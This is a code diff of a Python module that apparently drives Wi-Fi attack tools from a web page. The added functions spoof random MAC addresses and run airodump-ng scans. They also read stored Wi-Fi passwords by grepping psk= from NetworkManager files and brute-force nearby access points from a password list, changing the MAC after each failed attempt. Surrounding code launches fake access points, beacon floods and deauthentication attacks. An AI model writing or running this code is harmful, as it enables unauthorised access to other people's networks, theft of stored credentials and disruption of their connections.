@@ -22,7 +22,9 @@ __all__ = ['network_manager_stop', 'network_manager_read_conf', 'change_mac',
            'get_iwlist_channel', 'get_iw_dev_wlan_link', 'connecting_aps_wifi',
            'set_scapy_lan_scan', 'set_fluxion', 'get_cat_proc_net_dev',
            'set_wifijammer',  'get_iw_reg_get', 'set_add_wlanXmon_type_monitor',
-           'get_ls_sys_class_net', 'set_create_ap']
+           'get_ls_sys_class_net', 'set_create_ap', 'connecting_aps',
+           'get_system_connections', 'set_airodump_manufacturer_uptime_wps',
+           'get_dmesg_wlan', 'set_airodump_channel_36_177']
 
 
 def model(cmd, arg):
@@ -33,14 +35,20 @@ def model(cmd, arg):
     return result
 
 
-def change_mac():
+def set_new_mac():
+    source = list(map(lambda x: "%02x".upper() % int(random() * 0xFF), range(5)))
+    new_mac = "00:" + ':'.join(source)
+    return new_mac
+
+
+def change_mac(mac):
     if 'monitor' in get_iw_wlan_info():
         msg = ("<h2><font color='red'><p>Fail !!!</p></font>"
                f"{WLAN} interface mode <font color='red'>monitor</font>.<p>"
                "Change mode to <font color='green'>managed</font></p></h2>")
         return msg
     cmd = [f"ifconfig {WLAN} down",
-           f"ifconfig {WLAN} hw ether 00:11:22:33:44:55",
+           f"ifconfig {WLAN} hw ether {mac}",
            f"ifconfig {WLAN} up"]
     [subprocess.call(i, shell=True) for i in cmd]
     return "<h2>mac address <font color='green'>changed</h2></font>"
@@ -230,6 +238,28 @@ def set_airodump():
     return "<h2><font color='red'>FINISH</font></h2>"
 
 
+def set_airodump_channel_36_177():
+    getout = subprocess.getoutput(f'iw {WLAN} info')[10:90]
+    if f'{WLAN}' and 'type monitor' not in getout:
+        set_mode_managed()
+        set_wlan_set_type_monitor()
+    cmd = (f"gnome-terminal --tab -- bash -c "
+           f"'airodump-ng --channel 36-177 {WLAN}'")
+    model(cmd=cmd, arg='')
+    return "<h2><font color='red'>FINISH</font></h2>"
+
+
+def set_airodump_manufacturer_uptime_wps():
+    getout = subprocess.getoutput(f'iw {WLAN} info')[10:90]
+    if f'{WLAN}' and 'type monitor' not in getout:
+        set_mode_managed()
+        set_wlan_set_type_monitor()
+    cmd = (f"gnome-terminal --tab -- bash -c "
+           f"'airodump-ng {WLAN} --manufacturer --uptime --wps'")
+    model(cmd=cmd, arg='')
+    return "<h2><font color='red'>FINISH</font></h2>"
+
+
 def set_airbase_fake_ap():
     set_add_mon_type_monitor()
     cmd = f"xterm -e airbase-ng -a 44:E9:DD:27:D8:F6 -e FREE -c 10 -Z 4 {MON}"
@@ -239,10 +269,10 @@ def set_airbase_fake_ap():
 
 def set_mdk3_fake_ap():
     set_add_mon_type_monitor()
-    cmd = f"xterm -e mdk3 {MON} b -v fake_ap -g -m"
+    cmd = f"xterm -e mdk3 {MON} b -v {FAKE_APS} -g -m"
     # cmd = f"xterm -e mdk3 {MON} b -n 'FREE WIFI' -g -t 00:1E:20:36:24:3C -m -c 11"
-    result = model(cmd=cmd, arg='')
-    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
+    model(cmd=cmd, arg='')
+    return "<h2><font color='red'>FINISH</font></h2>"
 
 
 def set_mdk4_deauthentication():
@@ -637,3 +667,51 @@ def free_port(port: int) -> None:
     """ Terminates processes occupying the given port """
     pids: List[int] = get_pids(port)[0]
     [kill(pid, signal.SIGINT) for pid in pids if pids]
+
+
+def get_system_connections() -> str:
+    result = ''
+    cmd = ("grep psk= /etc/NetworkManager/system-connections/*",
+           "nmcli -s connection show | grep wifi")
+    for i in cmd:
+        result += (f'<b>***** {i} *****</b><p>' + subprocess.getoutput(i) + '</p>')
+        # [20:].replace('.nmconnection', '')
+    return f"<h2><font color='blue'><pre>{result}</pre></font></h2>"
+
+
+def get_dmesg_wlan() -> str:
+    cmd = 'dmesg -J | grep wlan'
+    result = (f'<b>***** {cmd} *****</b><p>' + subprocess.getoutput(cmd) + '</p>')
+    return f"<h2><font color='blue'><pre>{result}</pre></font></h2>"
+
+
+def get_list_essid():
+    cmd = f"iwlist {WLAN} scan | grep ESSID"
+    stdout = subprocess.getoutput(cmd)
+    output = [i.strip().replace('"', '') for i in stdout.split('ESSID:')]
+    [output.remove(i) for i in output if not i]
+    return output
+
+
+def connect_list_essid(ap_passwd):
+    for ap, passwd in ap_passwd.items():
+        cmd = f"nmcli dev wifi con '{ap}' password {passwd}"
+        result = model(cmd=cmd, arg='')
+        if result:
+            return result
+    return False
+
+
+def connecting_aps() -> str:
+    set_mode_managed()
+    with open(DEFAULT_PASS, 'r') as password:
+        passwd = password.read().split('\n')
+    aps_list = get_list_essid()
+    while passwd:
+        ap_passwd = dict.fromkeys(aps_list, passwd.pop())
+        result = connect_list_essid(ap_passwd)
+        if result:
+            return f"<h2><font color='green'><pre>{result}</pre></font></h2>"
+        change_mac(set_new_mac())
+    return "<h2><font color='red'>NOT CONNECTING</font></h2>"
+
